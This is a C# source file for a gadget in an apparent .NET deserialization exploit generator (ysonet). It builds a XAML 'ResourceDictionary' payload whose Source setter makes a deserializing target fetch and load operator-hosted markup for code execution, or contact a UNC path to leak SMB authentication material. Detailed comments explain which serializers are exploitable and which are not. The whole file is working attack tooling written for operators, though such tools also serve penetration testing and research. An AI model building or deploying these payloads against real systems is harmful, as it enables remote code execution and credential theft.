using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Windows.ResourceDictionary.Source is a public read/write Uri property whose
    /// SETTER does the work. Assigning it makes the deserializing process:
    ///
    ///   1. resolve the value against the dictionary's base URI (BindUriHelper.GetResolvedUri),
    ///   2. build a WebRequest for it (WpfWebRequestHelper.CreateRequest),
    ///   3. OPEN THE REQUEST (WpfWebRequestHelper.GetResponseStream) - the outbound call, and
    ///   4. hand the response stream to the WPF loader (MimeObjectFactory), which picks BAML
    ///      or XAML by content type and builds whatever the fetched document declares.
    ///
    /// Step 3 is the callback and step 4 is the code execution, so one payload shape covers
    /// two operator uses:
    ///
    ///   -c http://host/x.xaml   the operator hosts markup; the target fetches and LOADS it.
    ///   -c \\host\share\x       no hosted content needed; opening the SMB session is the
    ///                           effect, and Windows sends authentication material with it.
    ///
    /// Everything this gadget emits lives in this file: the target type name, the member
    /// name and the one document template.
    ///
    /// TWO SCOPE QUESTIONS, BOTH ANSWERED, so nobody re-opens them from scratch.
    ///
    /// 1. WHY THIS IS NOT ObjectDataProvider's ResourceDictionary WRAPPER. That gadget's
    ///    variant 2 (and the inner XAML in its XmlSerializer/DataContractSerializer/FsPickler
    ///    branches) also names ResourceDictionary, but as a CONTAINER holding an
    ///    ObjectDataProvider - `Add("", odp)`. It never touches Source, nothing is fetched,
    ///    and the sink is still Process.Start. One member is the whole difference: this
    ///    gadget is Source and its WebRequest; that one is a XAML serialization detail of the
    ///    ODP graph.
    ///
    /// 2. WHY THERE IS NO DeferrableContent VARIANT. ResourceDictionary has a second
    ///    dangerous-looking member: `DeferrableContent`, whose setter (`SetDeferrableContent`)
    ///    feeds a compiled BAML stream to a Baml2006Reader in-process - the same class of
    ///    effect with no network at all. It is NOT BUILDABLE by any serializer this tool
    ///    supports, and that was checked rather than assumed:
    ///      - `System.Windows.DeferrableContent` has ONE constructor and it is `internal`,
    ///        taking a Stream plus a Baml2006SchemaContext, an IXamlObjectWriterFactory, an
    ///        IServiceProvider and the root object. There is no public or parameterless one,
    ///        so nothing can construct it by name.
    ///      - Its `[TypeConverter(typeof(DeferrableContentConverter))]` does convert from
    ///        `Stream` and `byte[]`, which is what makes it look reachable - but
    ///        `ConvertFrom` demands a LIVE BAML load context and throws otherwise: an
    ///        `IXamlSchemaContextProvider` whose SchemaContext really is a
    ///        `Baml2006SchemaContext` ("ExpectedBamlSchemaContext"), plus an
    ///        `IXamlObjectWriterFactory`, an `IProvideValueTarget` whose TargetObject is a
    ///        ResourceDictionary, and an `IRootObjectProvider`. A general-purpose serializer
    ///        supplies none of them and passes a null context (ArgumentNullException), and a
    ///        plain XAML text parse supplies an XamlSchemaContext that is not a BAML one.
    ///      - The property's getter always returns null, and the setter dereferences
    ///        `deferrableContent.SchemaContext` immediately, so there is no null-tolerant path
    ///        either.
    ///    In other words it only exists partway through a real compiled-BAML load. This is a
    ///    closed question, not deferred work.
    /// </summary>
    public class ResourceDictionaryGenerator : GenericGenerator
    {
        private bool rawInput;

        // The version axis describes the framework the TARGET PROCESS RUNS ON. The span is
        // inherited from the ObjectDataProvider variant this gadget replaces, whose recorded
        // evidence was a fire on 4.8.1, and re-earned here by this gadget's own fire row in
        // PayloadsFireIntoTestSinks.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network, PayloadKind.CodeExecution,
                    PayloadKind.NestedDeserialization)
                // Declared rather than derived: CommandInput() is Url because the remote
                // markup use is primary, but a UNC path and a plain target path are equally
                // valid -c values and an operator hunting for either should find this gadget.
                .WithInputs(PayloadInput.RemoteUrl, PayloadInput.UncPath, PayloadInput.TargetPath)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                // PresentationFramework 4.0.0.0 chain; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "ResourceDictionary.Source makes the target fetch -c and load it as WPF markup. A UNC path instead coerces an SMB session, which sends authentication material.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        /// <summary>
        /// Xaml, and only Xaml. That is measured, not an omission, and the reasons are worth
        /// keeping because they split into three groups that generalise to any future gadget
        /// aiming at this carrier.
        ///
        /// ResourceDictionary implements IDictionary, so a serializer that infers a CONTRACT
        /// from the type builds a dictionary and never looks for a property called Source:
        ///
        ///   Json.NET, JavaScriptSerializer, YamlDotNet - the dangerous ones. Each really
        ///     does construct a System.Windows.ResourceDictionary from the type name, then
        ///     stores "Source" as a dictionary KEY. No exception, Source stays null, nothing
        ///     is fetched. A generation-only or did-it-throw check passes on all three.
        ///   DataContractSerializer, DataContractJsonSerializer - a collection contract:
        ///     the document is ArrayOfKeyValueOfanyTypeanyType / [{"Key":..,"Value":..}],
        ///     which has no place to name a member at all.
        ///   XmlSerializer - refuses the type outright: "not supported because it implements
        ///     IDictionary".
        ///
        /// Source is typed Uri, and two serializers that DO reach the property cannot build
        /// one (Uri has no public parameterless constructor and no settable members):
        ///
        ///   FastJson - "Unable to cast object of type 'System.String' to type 'System.Uri'".
        ///   SharpSerializer, both modes - "Unknown simple type: System.Uri".
        ///
        /// And three refusals that are about the type, not the document:
        ///
        ///   BinaryFormatter, SoapFormatter, LosFormatter, FsPickler - ResourceDictionary is
        ///     not [Serializable] (Type.IsSerializable is false), so the reader rejects it
        ///     before it creates anything and no document shape helps.
        ///   NetDataContractSerializer - InvalidDataContractException: not a data contract.
        ///   MessagePackTypeless and its Lz4 flavour - "System.Windows.ResourceDictionary"
        ///     is on MessagePack's own hardcoded gadget DENY LIST, so its TypelessFormatter
        ///     refuses to create the type however the payload is written.
        ///
        /// Xaml works because it is the one format here that assigns members by name AND
        /// runs the Uri type converter over the attribute text.
        /// </summary>
        public override List<string> SupportedFormatters()
        {
            return new List<string> { Formatters.Xaml };
        }

        // Url, because the remote-markup use is primary and the prompt must not imply a
        // scheme is required. The option help and AdditionalInfo() name the UNC form too, and
        // Facets() carries all three accepted inputs for the category search.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override OptionSet Options()
        {
            return RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            string uri = inputArgs.Cmd;

            // Build and shrink FIRST with the self-test off, so a value --minify rewrote is
            // refused before -t makes THIS machine open the wrong URL. Everything below can
            // then assume the emitted document still carries what the operator typed.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(BuildPayload(uri, formatter), formatter, probeArgs);
            RefuseIfUriDidNotSurvive(probe, uri, formatter, inputArgs);

            if (!inputArgs.Test)
                return probe;

            // The operator asked for a self-test, so hand the same document to the shared
            // path again and let it deserialize.
            return FinishHandWrittenPayload(BuildPayload(uri, formatter), formatter, inputArgs);
        }

        private object BuildPayload(string input, string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // The whole payload is one element. The default xmlns is the WPF presentation
                // namespace, so ResourceDictionary resolves without naming an assembly, and
                // the Uri type converter turns the attribute text into Source's value.
                return @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>";
            }

            throw UnsupportedFormatter(formatter);
        }

        /// <summary>
        /// The URI is operator DATA the target opens, and --minify is not text preserving on
        /// an XML attribute: XmlMinifier collapses "a; b" into "a;b" and trims whitespace.
        /// That is deliberate - it is what shrinks an embedded XAML document - so the
        /// minifier is not the thing to change. Verify instead, and refuse: a payload that
        /// quietly fetches a different URL is the worst outcome.
        ///
        /// Verify, do not predict. A "reject a semicolon" rule would miss the next minifier
        /// change; this compares the DECODED attribute value against what was typed.
        ///
        /// Skipped under --rawinput, where the operator has taken the escaping decision
        /// themselves and the document is not guaranteed to parse.
        /// </summary>
        private void RefuseIfUriDidNotSurvive(object payload, string uri, string formatter,
            InputArgs inputArgs)
        {
            if (rawInput)
                return;
            if (MinifiedTextGuard.MissingTextValues(payload, new[] { uri }).Count == 0)
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this URI with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + uri
                + "\" exactly, so the target would open a different location."
                + (minified
                    ? " Drop --minify, or use a value with no repeated spaces and no \"; \" sequence."
                    : " Use a value with no carriage return and no leading or trailing whitespace."));
        }
    }
}
